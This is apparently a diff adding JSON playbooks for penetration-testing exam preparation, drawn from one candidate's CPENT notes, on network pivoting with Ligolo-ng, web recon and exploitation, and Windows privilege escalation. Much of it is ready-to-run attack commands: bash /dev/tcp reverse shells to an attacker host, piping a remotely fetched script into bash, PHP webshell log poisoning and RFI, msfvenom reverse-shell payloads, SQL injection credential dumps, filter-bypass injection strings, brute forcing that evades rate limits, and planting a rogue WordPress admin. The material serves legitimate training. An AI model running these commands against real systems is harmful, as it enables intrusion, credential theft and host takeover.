+            "action": "1. sudo ip tuntap add user $(whoami) mode tun ligolo + sudo ip link set ligolo up (or interface_create --name ligolo in proxy CLI). 2. sudo ./proxy -selfcert -laddr 0.0.0.0:11601. 3. ./agent -connect <kali>:11601 -ignore-cert (or -accept-fingerprint <HASH>). 4. session → ifconfig → route_add --route 172.16.1.0/24 → tunnel_start --tun ligolo",
+            "fallback": "Use autoroute to auto-detect all agent routes"
+          },
+          {
+            "condition": "No proxychains needed - direct access",
+            "action": "After tunnel_start: nmap -sT -Pn 172.16.1.0/24; smbclient, evil-winrm, xfreerdp all work directly (no proxychains)",
+            "fallback": "240.0.0.1 maps to pivot's 127.0.0.1 loopback services (curl http://240.0.0.1:8080)"
+          },
+          {
+            "condition": "Reverse shell / file transfer through tunnel",
+            "action": "[Agent] listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp; listener_list. Binds port 4444 on pivot, relays inbound to attacker through tunnel",
+            "fallback": "For meterpreter: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<pivot-ip> LPORT=4444 -f exe -o shell.exe; handler with LHOST=0.0.0.0 LPORT=4444"
+          },
+          {
+            "condition": "Double/triple pivot with Ligolo-ng",
+            "action": "1. Single pivot to Pivot1 up (route to 172.16.1.0/24). 2. Create 2nd TUN: sudo ip tuntap add user $(whoami) mode tun ligolo-double. 3. [Agent:pivot1] listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (relay new agents back). 4. ./agent -connect 172.16.1.10:11601 -ignore-cert on Pivot2. 5. session 2 → ifconfig → route_add --name ligolo-double --route 192.168.50.0/24 → tunnel_start --tun ligolo-double",
+            "fallback": "Triple pivot: repeat with ligolo-triple TUN, listener on Pivot2 forwarding to Pivot3"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 4 - Ligolo-ng GUI (WebUI)",
+        "techniques": [
+          "pivoting",
+          "double-pivot"
+        ],
+        "tools": [
+          "ligolo-ng"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Visual/team pivot needed",
+            "action": "sudo ./proxy -selfcert -webui (WebUI at http://localhost:8080); optional -webui-addr 0.0.0.0:9090. GUI mirrors CLI: agent visualization, topology map, route/tunnel/listener management",
+            "fallback": "Config file (config.yaml) to auto-start proxy+webui+preset routes/listeners: ./proxy -config config.yaml"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 5 - Chisel vs Ligolo-ng Comparison",
+        "techniques": [],
+        "tools": [],
+        "decisionPoints": [
+          {
+            "condition": "Choosing tool for exam scenario",
+            "action": "Chisel: HTTP/SSH tunnel + SOCKS5 proxy, needs proxychains, manual multi-pivot chaining. Ligolo-ng: TUN interface + gVisor, NO proxychains needed, native transparent multi-pivot via listener_add, has WebUI",
+            "fallback": "Chisel for quick single-hop; Ligolo-ng for full subnet enumeration and multi-pivot"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 6 - Session/Lifecycle Management & Cleanup",
+        "techniques": [
+          "pivoting"
+        ],
+        "tools": [
+          "ligolo-ng",
+          "chisel"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Cleaning up after pivot",
+            "action": "Ligolo: tunnel_list; tunnel_stop; route_list; route_del --name ligolo --route 172.16.1.0/24; listener_list; listener_stop <ID>; interface_delete --name 'ligolo-double'; agent_kill; kill. Chisel: kill chisel processes on both attacker and pivot",
+            "fallback": "Document each hop with: IP addresses, tool used, command run, screenshot of ip route and session list"
+          }
+        ]
+      },
+      {
+        "phase": "Stage 7 - Cross-Platform Notes (Windows/Mac Attacker)",
+        "techniques": [],
+        "tools": [],
+        "decisionPoints": [
+          {
+            "condition": "Attacker is Windows (not Kali)",
+            "action": "Windows: netsh int ipv4 show interfaces; route add 172.16.1.0 mask 255.255.255.0 0.0.0.0 if [INTERFACE_IDX]. Use plink.exe for SSH tunneling instead of chisel binary",
+            "fallback": "macOS: sudo ifconfig utun4 alias 172.16.1.99 255.255.255.0; sudo route add -net 172.16.1.0/24 -interface utun4 (use utunX not ligolo)"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "recon-argha-dey-methodology",
+    "zone": "recon",
+    "name": "Argha Dey Master Recon Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "15-phase end-to-end reconnaissance checklist derived from Argha Dey's notes. The chain: Nmap → Web tech fingerprint → Directory fuzzing → Hidden file/leak → Anonymous access → .git leaks → Backup files → CMS enum → Burp workflow → Credential attacks → File upload → LFI → CMDi → IoT recon → Post-foothold enum.",
+    "examHabits": [
+      "nmap -sC -sV -T4 -Pn -A -oN <ip>.txt <ip> - note every open port, not just 80/443",
+      "If FTP open: try anonymous login, binary +passive, grab everything",
+      "whatweb / check http-generator, Server header, page title, favicon for tech fingerprint",
+      "view-source the homepage - read every comment, every <a href>",
+      "curl -s http://<ip>/robots.txt and /sitemap.xml",
+      "Directory/file fuzz with feroxbuster (recursive) then ffuf, common.txt first then big.txt",
+      "Specifically probe for /.git/, /backup/, /.env, /config.php.bak, /uploads/",
+      "If .git found: git_dumper.py, then git log + git show <every commit>",
+      "If a login form exists: test for SQLi with single quote; if error, sqlmap -r request.txt --dbs --batch",
+      "If CMS identified: run the matching scanner (WPScan, etc.) and Google default creds + CVEs for the exact version",
+      "If a utility feature exists (ping/upload/search/reset-password): test command injection, file-upload bypass, IDOR, and logic-flaw abuse",
+      "Any parameter that loads a page or file: test LFI, then pivot to log poisoning",
+      "On foothold: sudo -l, SUID hunt, LinPEAS, GTFOBins, cron jobs, readable id_rsa/config secrets",
+      "Never stop at the first flag - the chain usually continues to root or pivots to a second host"
+    ],
+    "quickRef": "nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | whatweb http://<ip>/",
+    "steps": [
+      {
+        "phase": "Phase 1 - Network & Service Recon",
+        "techniques": [
+          "passive-recon",
+          "arp-discovery",
+          "dns-enumeration"
+        ],
+        "tools": [
+          "nmap",
+          "amass",
+          "subfinder",
+          "masscan",
+          "naabu"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Open web ports: 80, 443, 8080, 8000, 8081, 8443",
+            "action": "Run whatweb and check http-title/http-server-header/http-generator",
+            "fallback": "Proceed to full NSE script scan on non-web ports"
+          },
+          {
+            "condition": "FTP open with ftp-anon",
+            "action": "Anonymous FTP login, binary mode, passive, ls and get everything",
+            "fallback": "Check SMB for anonymous shares"
+          },
+          {
+            "condition": "Large subnet (>/16)",
+            "action": "nmap -p- -T4 --min-rate 5000 -oG allports.txt <ip>, then re-run -sV only on discovered ports",
+            "fallback": "Use full scan with -T4 -A"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Web Technology Fingerprinting",
+        "techniques": [
+          "passive-recon"
+        ],
+        "tools": [
+          "whatweb",
+          "nmap",
+          "httpx",
+          "ffuf"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "http-generator reveals WordPress x.x.x",
+            "action": "Proceed to WPScan enumeration",
+            "fallback": "Google product + version for known CVEs"
+          },
+          {
+            "condition": "Default Apache/Nginx page",
+            "action": "Fuzz for real vhost/path with feroxbuster/ffuf",
+            "fallback": "Check for hidden admin portals in page source"
+          },
+          {
+            "condition": "Second web port (8080/8081)",
+            "action": "Scan separately - common pattern: one port = public site, other = internal admin panel",
+            "fallback": "Check page source comments for employee/admin portals"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - Directory, File & Vhost Fuzzing",
+        "techniques": [
+          "passive-recon"
+        ],
+        "tools": [
+          "feroxbuster",
+          "ffuf",
+          "gobuster"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Need recursive directory discovery",
+            "action": "feroxbuster -u http://<ip>/ -k -w /usr/share/seclists/Discovery/Web-Content/{common,big,raft-*.txt}",
+            "fallback": "Use ffuf for extension-aware fuzzing"
+          },
+          {
+            "condition": "extension fuzzing needed",
+            "action": "ffuf -u http://<ip>/FUZZ -w seclists/big.txt -e .php",
+            "fallback": "gobuster dir -u http://<ip>/ -w seclists/big.txt -x php,txt,bak,zip"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - Anonymous Service Access (FTP / SMB)",
+        "techniques": [
+          "passive-recon"
+        ],
+        "tools": [
+          "nmap",
+          "smbclient",
+          "enum4linux",
+          "smbmap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "FTP open on target",
+            "action": "ftp anonymous@<ip>; binary; passive; ls; get files",
+            "fallback": "Check SMB shares: smbclient -L //<ip> -N"
+          },
+          {
+            "condition": "SMB open",
+            "action": "netexec smb <ip> -u '' -p '' or smbclient -L //<ip> -N",
+            "fallback": "Proceed to LDAP anonymous bind check"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Source Code / Version Control Leaks (.git)",
+        "techniques": [
+          "file-inclusion"
+        ],
+        "tools": [
+          "feroxbuster",
+          "ffuf",
+          "git-dumper",
+          "nmap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "/.git/ directory found (HTTP 200 on /.git/HEAD, /.git/config)",
+            "action": "git_dumper.py http://<ip>/.git/ ./dumped_dir, then git log + git show <every commit>",
+            "fallback": "wget -r http://<ip>/.git/"
+          },
+          {
+            "condition": "Commit history contains removed secrets",
+            "action": "git log -p to inspect full diffs; old commits still contain live creds",
+            "fallback": "grep -R -i -E 'pass|secret|key|token' dumped_dir/"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - Backup Files & Database Dumps",
+        "techniques": [
+          "file-inclusion"
+        ],
+        "tools": [
+          "feroxbuster",
+          "ffuf",
+          "nmap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Directory fuzzing surfaces .sql/.bak/.zip/.tar.gz files",
+            "action": "wget http://<ip>/backup/old_database.sql; grep -i -E 'insert into|user|pass' old_database.sql",
+            "fallback": "Check for security question answers for password-reset abuse"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 7 - CMS / Application-Specific Enumeration",
+        "techniques": [
+          "sql-injection"
+        ],
+        "tools": [
+          "wpscan",
+          "cmsmap",
+          "nmap",
+          "ffuf"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "WordPress detected via http-generator",
+            "action": "wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --disable-tls-checks",
+            "fallback": "Enumerate users via REST API: curl /wp-json/wp/v2/users"
+          },
+          {
+            "condition": "Branded login page (OTRS, Jenkins, phpMyAdmin, Tomcat)",
+            "action": "Google '<product> default credentials' + '<product> CVE <year>'",
+            "fallback": "Try well-known default pairs even if not documented default"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 8 - Intercepting Proxy Workflow (Burp Suite)",
+        "techniques": [
+          "sql-injection"
+        ],
+        "tools": [
+          "burp-suite",
+          "sqlmap"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Form submission needs interception",
+            "action": "Proxy > Intercept on, submit form, save request to request.txt for sqlmap",
+            "fallback": "Send to Repeater for manual parameter tampering"
+          },
+          {
+            "condition": "Need to brute-force a field",
+            "action": "Send to Intruder: Cluster bomb (unknown user+pass), Sniper (one known), numeric range for OTP",
+            "fallback": "Diff rendered page vs raw HTML response for hidden tokens"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 9 - Credential Attacks",
+        "techniques": [
+          "sql-injection",
+          "password-spraying"
+        ],
+        "tools": [
+          "hydra",
+          "kerbrute",
+          "sqlmap",
+          "burp-suite"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Injectable parameter confirmed with single quote (SQL error visible)",
+            "action": "sqlmap -r request.txt -dbs --batch",
+            "fallback": "Manual UNION-based extraction"
+          },
+          {
+            "condition": "Login form with valid username known",
+            "action": "hydra -L users.txt -P passwords.txt <ip> http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
+            "fallback": "Use Burp Intruder with Cluster Bomb for extra form fields"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 10 - File Upload Abuse",
+        "techniques": [
+          "file-inclusion"
+        ],
+        "tools": [
+          "burp-suite",
+          "ffuf",
+          "commix"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Upload feature found with extension restriction (.pdf/.html/.image)",
+            "action": "Craft PHP reverse shell, rename to shell.php.pdf, intercept POST in Burp, rewrite filename to shell.php",
+            "fallback": "Flip hidden allow_all parameter or change Content-Type to application/octet-stream"
+          },
+          {
+            "condition": "Upload directory discovered (/uploads/, /customerdocs/)",
+            "action": "Start listener: rlwrap nc -lnvp 4444; curl http://<ip>/uploads/shell.php",
+            "fallback": "Check for client-side validation bypass comments in page source"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 11 - LFI & Log Poisoning",
+        "techniques": [
+          "lfi-advanced"
+        ],
+        "tools": [
+          "ffuf",
+          "liffy",
+          "burp-suite",
+          "curl"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "?page= parameter confirmed with traversal",
+            "action": "Test ....// bypass if ../ is filtered; then poison Apache User-Agent via curl -A",
+            "fallback": "Try auth.log, PHP session files, data:// wrapper"
+          },
+          {
+            "condition": "Log file unreachable / log poisoning blocked",
+            "action": "Try /proc/self/environ poison or PHP session file poisoning",
+            "fallback": "Use php://filter/convert.base64-encode to read config.php for DB creds"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 12 - Command Injection Recon",
+        "techniques": [
+          "cmdi-advanced"
+        ],
+        "tools": [
+          "ffuf",
+          "commix",
+          "burp-suite",
+          "curl"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Utility pages found (ping.php, diag.php, traceroute.php, nslookup.php)",
+            "action": "Test separators: ; id, | id, $(id), %0a id, URL-encoded variants",
+            "fallback": "Use commix --url=... for automatic technique detection"
+          },
+          {
+            "condition": "Injection confirmed but single-command only",
+            "action": "Check for encoded secrets via ?ip=|cat ..%2Fssh_pk_creds.txt",
+            "fallback": "Decode with CyberChef (Base64 → RC4/XOR recipe)"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 13 - IoT / Firmware Recon (adjacent)",
+        "techniques": [
+          "firmware-extraction"
+        ],
+        "tools": [
+          "binwalk",
+          "strings",
+          "file"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Firmware file discovered on IoT target",
+            "action": "binwalk <file>; binwalk -e <file>; file extracted blobs",
+            "fallback": "strings <binary> | grep -i 'busybox|gcc|linux version'"
+          },
+          {
+            "condition": "Config DB discovered (config.sqlite)",
+            "action": "sqlite3 config.sqlite .dump | grep -i <keyword>",
+            "fallback": "grep -R 'DeviceID' . for device model identification"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 14 - Post-Foothold Local Enumeration",
+        "techniques": [
+          "passive-recon"
+        ],
+        "tools": [
+          "linpeas",
+          "linenum"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Any shell obtained (webshell, reverse shell, SSH)",
+            "action": "whoami; id; hostname; uname -a; cat /etc/passwd | grep bash; sudo -l; find / -perm -4000 -type f 2>/dev/null",
+            "fallback": "Run LinPEAS: curl http://<attacker>/linpeas.sh | bash"
+          },
+          {
+            "condition": "Shell is non-interactive",
+            "action": "stabilize: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; stty raw -echo; export TERM=xterm",
+            "fallback": "socat file:tty,raw,echo=0 tcp-listen:4444 (attacker) + socat exec:bash -li... (victim)"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 15 - Master Recon Checklist (mental, every new Web Range IP)",
+        "techniques": [],
+        "tools": [
+          "nmap",
+          "whatweb",
+          "feroxbuster",
+          "ffuf",
+          "sqlmap",
+          "linpeas"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Starting a new box",
+            "action": "Run entire checklist: nmap → whatweb → view-source → robots.txt → ffuf → .git/.backup/.env → SQLi test → CMS scan → utility feature test → LFI test → foothold → sudo -l/SUID/LinPEAS",
+            "fallback": "Use the full phase list above as execution guide"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "web-argha-dey-methodology",
+    "zone": "web",
+    "name": "Argha Dey Web Exploitation Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Combined web-range playbook covering Recon → SQLi → LFI → CMDi → WordPress. Includes detection-to-RCE decision trees for LFI, manual exploitation workflow for CMDi (Read → Enumerate → Shell), and a 9-phase WordPress chain.",
+    "examHabits": [
+      "nmap's http-generator script output often reveals the exact WP version before running WPScan",
+      "Save the raw request from Burp and drive sqlmap with -r; don't hand-build -u/-data",
+      "Always run --batch in an exam/scripted context",
+      "Enumerate dbs → --tables → --columns → --dump in that order",
+      "Check every column of every dumped table - CPENT hides the real answer in unexpected columns",
+      "Note the exact -technique sqlmap reports (boolean/time/union/error)",
+      "If sqlmap fails, manually test with ' AND SLEEP(5) before assuming not injectable",
+      "Pivot immediately on any found DB credentials to SSH/other services"
+    ],
+    "quickRef": "nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | sqlmap -r request.txt -dbs --batch | wpscan --url http://<ip>/ -e vp,u,vt,cb,m --api-token <token>",
+    "steps": [
+      {
+        "phase": "Phase 1 - Recon & Fingerprinting",
+        "techniques": [
+          "passive-recon"
+        ],
+        "tools": [
+          "nmap",
+          "whatweb",
+          "ffuf",
+          "feroxbuster",
+          "httpx",
+          "wpscan"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "HTTP service identified",
+            "action": "nmap -p80,443 -sV --script http-title,http-server-header,http-generator; whatweb http://<ip>/",
+            "fallback": "Check for WordPress via readme.html or wp-login.php"
+          },
+          {
+            "condition": "WordPress confirmed (http-generator: WordPress x.x.x)",
+            "action": "Run full WPScan: wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --disable-tls-checks --api-token <token>",
+            "fallback": "Proceed with generic web testing"
+          },
+          {
+            "condition": "Need directory discovery",
+            "action": "feroxbuster -u http://<ip>/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt (fast first pass) then big.txt",
+            "fallback": "ffuf -u http://<ip>/FUZZ -w seclists/big.txt -e .php for extension-aware fuzzing"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - SQL Injection (Detection-to-Dump Workflow)",
+        "techniques": [
+          "sql-injection"
+        ],
+        "tools": [
+          "sqlmap",
+          "burp-suite",
+          "nmap",
+          "ffuf"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Input field suspected injectable",
+            "action": "Manually inject single quote (') — if verbose SQL error shows, backend is identified immediately",
+            "fallback": "Test ' OR '1'='1' -- - for auth bypass; ' OR SLEEP(5) -- - for time-based blind"
+          },
+          {
+            "condition": "Raw request captured in Burp",
+            "action": "Save as request.txt; sqlmap -r request.txt -dbs --batch",
+            "fallback": "sqlmap -r request.txt -D <database> --tables --batch"
+          },
+          {
+            "condition": "Table dumped, looking for pivot creds",
+            "action": "sqlmap -r request.txt -D <db> -T <table> --columns --batch; --dump only specific columns if needed",
+            "fallback": "UNION-based manual: ' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users -- -"
+          },
+          {
+            "condition": "DB credentials found in unexpected column",
+            "action": "Pivot to SSH/other service with discovered creds (user_ssh1, user_auth columns)",
+            "fallback": "Look for security question answers for password-reset abuse"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - LFI: Detection-to-RCE Decision Tree",
+        "techniques": [
+          "lfi-advanced"
+        ],
+        "tools": [
+          "curl",
+          "ffuf",
+          "liffy",
+          "burp-suite"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "?page= or similar parameter confirmed with /etc/passwd read",
+            "action": "Determine filter behavior: try ../, ....//, ..%2f, ..%252f, /etc/passwd (absolute), php://filter wrapper",
+            "fallback": "Blind LFI: time-based via huge file, or OOB callback"
+          },
+          {
+            "condition": "Can read Apache/Nginx access log",
+            "action": "Fastest path: curl http://<target>/ -A '<?php system($_GET[\"cmd\"]); ?>'; then ?page=.../access.log&cmd=id",
+            "fallback": "Try auth.log, vsftpd.log, mail spool"
+          },
+          {
+            "condition": "App stores user input server-side (search/profile/lang cookie)",
+            "action": "Poison PHP session file: curl search.php?q=<?php system($_GET['cmd']); ?> -b PHPSESSID=<id>; then ?page=.../sess_<id>&cmd=id",
+            "fallback": "Try /proc/self/environ poisoning via User-Agent header"
+          },
+          {
+            "condition": "App has ANY upload (images/PDF even if no .php)",
+            "action": "Upload shell.jpg with PHP code; include via LFI (include() executes PHP regardless of extension)",
+            "fallback": "php://filter/convert.base64-encode to read config.php for DB creds without RCE"
+          },
+          {
+            "condition": "allow_url_include=On (rare)",
+            "action": "RFI: host payload; ?page=http://<attacker>/shell.txt&cmd=id",
+            "fallback": "data:// wrapper: echo -n payload | base64; ?page=data://text/plain;base64,<b64>&cmd=id"
+          },
+          {
+            "condition": "No RCE path working",
+            "action": "Pure info disclosure: read config.php / wp-config.php via php://filter for DB creds → pivot via SQLi/SSH",
+            "fallback": "Fall back to commix or manual enumeration"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - OS Command Injection (Read → Enumerate → Shell)",
+        "techniques": [
+          "cmdi-advanced"
+        ],
+        "tools": [
+          "curl",
+          "commix",
+          "burp-suite",
+          "ffuf"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Utility page found (ping.php, diag.php, nslookup.php, traceroute.php)",
+            "action": "Test separators: ; id, | id, $(id), `id`, &&, ||, %0a; URL-encode: %3B, %7C, %26",
+            "fallback": "Argument injection: --help, -oG output.txt"
+          },
+          {
+            "condition": "Output reflected (in-band)",
+            "action": "?ip=%7C+id; then enumerate: ?ip=|ls -la ../; ?ip=|cat ../filename.txt; ?ip=|sudo -l; ?ip=|find / -perm -4000 -type f",
+            "fallback": "If no output: test blind with sleep 5, or OOB via nslookup/curl to attacker"
+          },
+          {
+            "condition": "Space/filter blocked",
+            "action": "Use ${IFS}, %09 (tab), {cat,/etc/passwd}, or base64 obfuscation: $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
+            "fallback": "Use commix --url=... --level=3 --tamper=space2comment,charencode"
+          },
+          {
+            "condition": "Command confirmed, need stable shell",
+            "action": "Reverse shell: bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' or mkfifo named-pipe nc payload",
+            "fallback": "python3 -c 'import socket,subprocess,os;...' or php -r reverse shell"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - WordPress: 9-Phase Chain (Fingerprint → RCE)",
+        "techniques": [
+          "wordpress-exploitation"
+        ],
+        "tools": [
+          "wpscan",
+          "nmap",
+          "curl",
+          "burp-suite",
+          "searchsploit",
+          "metasploit"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "New target",
+            "action": "Phase 1: nmap -sC -sV -p80,443 - look for http-generator: WordPress; curl readme.html for exact version",
+            "fallback": "Check /wp-login.php, /wp-admin/, /wp-content/plugins/"
+          },
+          {
+            "condition": "WP version confirmed",
+            "action": "Phase 2: wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --api-token <token>",
+            "fallback": "Manual user enum: curl /?author=1 -I (grep location); curl /wp-json/wp/v2/users | jq"
+          },
+          {
+            "condition": "Valid username found",
+            "action": "Phase 4: wpscan --usernames users.txt --passwords rockyou.txt; OR hydra -l admin -P rockyou.txt <ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid'",
+            "fallback": "XML-RPC multicall: system.multicall tests many creds per request, evades simple rate-limiting"
+          },
+          {
+            "condition": "WPScan flags vulnerable plugin/theme",
+            "action": "Phase 5: searchsploit wordpress <plugin-name>; check installed version vs 'Fixed in' version; pull PoC, adapt IP/path",
+            "fallback": "nuclei -u http://<ip> -tags wordpress,wp-plugin,cve"
+          },
+          {
+            "condition": "wp-admin credentials obtained",
+            "action": "Phase 6: Theme Editor RCE (Appearance → Theme Editor → 404 Template → paste php-reverse-shell.php → trigger via /index.php/nonexistent/)",
+            "fallback": "Malicious plugin ZIP: mkdir evil-plugin; zip upload; http://<ip>/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=id"
+          },
+          {
+            "condition": "No wp-admin but DB access via SQLi/leaked config",
+            "action": "Phase 6.6: INSERT admin user into wp_users + wp_usermeta (wp_capabilities = administrator)",
+            "fallback": "Read wp-config.php via LFI php://filter for mysql -h <ip> -u wp_user -p to dump wp_users"
+          },
+          {
+            "condition": "Post-RCE on WordPress host",
+            "action": "Phase 9: cat /var/www/html/wp-config.php; mysql -e 'SELECT user_login,user_pass FROM wp_users;'; find / -perm -4000; sudo -l → proceed to standard Linux privesc",
+            "fallback": "Check for 777 scripts in cron jobs for instant root"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - File Upload Abuse",
+        "techniques": [
+          "file-inclusion"
+        ],
+        "tools": [
+          "burp-suite",
+          "ffuf",
+          "commix",
+          "curl"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Upload feature with extension restriction (.pdf/.html/.image only)",
+            "action": "Read page source for client-side validation comments; craft PHP reverse shell, rename shell.php.pdf, intercept POST, rewrite filename= to shell.php",
+            "fallback": "Change Content-Type to application/octet-stream or flip hidden allow_all=0 → 1"
+          },
+          {
+            "condition": "Upload directory discovered (/uploads/, /customerdocs/)",
+            "action": "rlwrap nc -lnvp 4444; curl http://<ip>/uploads/shell.php",
+            "fallback": "Check for double-extension bypass or null-byte tricks on older PHP"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 7 - Config & Backup File Leak Hunting",
+        "techniques": [
+          "lfi-advanced"
+        ],
+        "tools": [
+          "curl",
+          "wpscan",
+          "ffuf"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "WordPress target",
+            "action": "curl wp-config.php.bak, wp-config.php~, wp-config.php.save, wp-config.php.old, .wp-config.php.swp; wpscan -e cb (config backups) -e dbe (db exports)",
+            "fallback": "Check /wp-content/debug.log if WP_DEBUG_LOG enabled"
+          },
+          {
+            "condition": "General web app",
+            "action": "fuzz for: .env, config.php.bak, .git/, backup/*.zip, database.sql, shell.php.bak",
+            "fallback": "grep -R -i -E 'pass|secret|key|token' dumped_dir/ after .git extraction"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 8 - Post-Foothold & Shell Stabilization",
+        "techniques": [],
+        "tools": [
+          "linpeas",
+          "socat"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Webshell/reverse shell obtained",
+            "action": "Stabilize: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; Ctrl+Z; stty raw -echo; fg; export TERM=xterm",
+            "fallback": "socat file:tty,raw,echo=0 tcp-listen:4444 (attacker) + socat exec:bash -li... (victim)"
+          },
+          {
+            "condition": "Need local privesc",
+            "action": "curl http://<attacker>/linpeas.sh | bash; check sudo -l, SUID, cron, GTFOBins, world-writable files",
+            "fallback": "Manual: id; uname -a; /etc/passwd; env; ps aux; cat /etc/crontab"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "windows-privesc-argha-dey-methodology",
+    "zone": "privilege-escalation",
+    "name": "Argha Dey Windows Privilege Escalation Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Quick Decision Flow for the Exam: Get shell → systeminfo/whoami /priv → WinPEAS/PowerUp → SeImpersonate check → service/registry/scheduled task perms → kernel CVEs. Includes A-Z technique catalogue (AlwaysInstallElevated, Unquoted Service Paths, DLL Hijacking, Potato Family, UAC Bypass, GPP, etc.) and kernel exploit catalogue.",
+    "examHabits": [
+      "Always check patch level first (wmic qfe) — kernel exploits can BSOD the target",
+      "Check SeImpersonatePrivilege first — fast win via PrintSpoofer/GodPotato if service account",
+      "Check services/registry/scheduled tasks/file perms — safe wins, no crash risk",
+      "Only reach for kernel CVE if OS is unpatched and no config-based win exists",
+      "Confirm final privilege with whoami /priv + whoami /groups and grab proof (flag/hash)",
+      "Document: technique used, CVE ID, affected component, command sequence, and remediation"
+    ],
+    "quickRef": "systeminfo; whoami /priv; winPEAS.exe; PowerUp Invoke-AllChecks; PrintSpoofer.exe -c cmd (if SeImpersonate); accesschk.exe for service perms",
+    "steps": [
+      {
+        "phase": "Phase 0 - Baseline Enumeration",
+        "techniques": [],
+        "tools": [
+          "winpeas",
+          "powerup",
+          "seatbelt",
+          "sherlock",
+          "watson",
+          "accesschk"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Low-priv shell on Windows",
+            "action": "systeminfo; whoami /priv; whoami /groups; whoami /all; hostname; wmic qfe get Caption,Description,HotFixID,InstalledOn; wmic os get osarchitecture; ver; ipconfig /all; netstat -ano; net user; net localgroup administrators",
+            "fallback": "Run winPEASx64.exe + PowerUp Invoke-AllChecks + Seatbelt -group=all + Sherlock Find-AllVulns"
+          },
+          {
+            "condition": "systeminfo output available",
+            "action": "Cross-reference OS build against CVE database (MS17-010, BlueKeep, PrintNightmare, etc.)",
+            "fallback": "Use Watson.exe or Windows-Exploit-Suggester.py against systeminfo output"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 1 - AlwaysInstallElevated",
+        "techniques": [
+          "always-install-elevated"
+        ],
+        "tools": [
+          "msfvenom"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Both MSI install registry keys set to 1",
+            "action": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi; msiexec /quiet /qn /i evil.msi",
+            "fallback": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Unquoted Service Paths",
+        "techniques": [
+          "unquoted-service-paths"
+        ],
+        "tools": [
+          "wmic",
+          "accesschk"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Service path unquoted with spaces (C:\\Program Files\\My App\\service.exe)",
+            "action": "icacls 'C:\\Program Files\\My App'; drop malicious Program.exe in writable parent; sc start 'VulnSvc'",
